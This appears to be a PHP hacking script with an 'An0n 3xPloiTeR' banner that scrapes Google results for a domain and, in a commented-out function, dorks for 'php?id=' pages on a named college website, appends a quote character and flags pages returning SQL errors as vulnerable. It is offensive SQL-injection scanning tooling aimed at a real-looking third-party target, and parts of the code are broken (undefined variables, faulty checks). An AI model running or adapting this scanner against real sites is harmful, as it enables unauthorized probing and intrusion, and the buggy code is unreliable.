<?php

/*
_______________.___.
\______   \__  |   |
 |    |  _//   |   |
 |    |   \\____   |
 |______  // ______|
        \/ \/       
   _____         _______           ________        __________.__         ._____________   __________ 
  /  _  \   ____ \   _  \   ____   \_____  \___  __\______   |  |   ____ |__\__    _______\______   \
 /  /_\  \ /    \/  /_\  \ /    \    _(__  <\  \/  /|     ___|  |  /  _ \|  | |    |_/ __ \|       _/
/    |    |   |  \  \_/   |   |  \  /       \>    < |    |   |  |_(  <_> |  | |    |\  ___/|    |   \
\____|__  |___|  /\_____  |___|  / /______  /__/\_ \|____|   |____/\____/|__| |____| \___  |____|_  /
        \/     \/       \/     \/         \/      \/                                     \/       \/ 

                                ~ Changing Author Name Wont Make You One :) 
                                             #Respect Coders
*/

error_reporting(0);

function crawl($website) {

	$search = "site:" . $website. "";

	$pag = 10;

	for ($pag= 0; $pag < 10; $pag++){
			
		$url = "https://google.com/search?q=" . $search . "&ie=utf-8&oe=utf-8&aq=t&start=" . $pag . "0";
	 
		$input = file_get_contents($url);

		$regexp = "/<a href=\"\/url\?q=(.*?)&amp(.*?)\">/";

	 	if (preg_match_all($regexp, $input, $matches, PREG_SET_ORDER)) {

			foreach($matches as $match) {

				echo $match[1] . "\n";

				// thanks to inj3ct0r 0sman <3
			}
		}
	} 
}

/*

function SQLi($website) {

	$search = "inurl:php?id=&site:" . $website. "";

	$pag = 10;

	for ($pag= 0; $pag < 10; $pag++){
			
		$url = "https://google.com/search?q=" . $search . "&ie=utf-8&oe=utf-8&aq=t&start=" . $pag . "0";
	 
		$input = file_get_contents($url);

		$regexp = "/<a href=\"\/url\?q=(.*?)&amp(.*?)\">/";

	 	if (preg_match_all($regexp, $input, $matches, PREG_SET_ORDER)) {

			foreach($matches as $match) {

				$sites = $match[1];

				$filtered_site = urldecode($sites);

				$vuln_sites = $filtered_site . "%27";

 				$new = file_get_contents($vuln_sites);

 				$sqli = array('SQL syntax', 'MySQL', 'mysql_', 'argument is not');
 			      
				if(strpos($new, $sqli['0']) or $old != $new) {

					echo " [+] $sresu : vuln\n";

				}
			}
		}
	}
}

SQLi("maldacollege.ac.in");

*/

?>
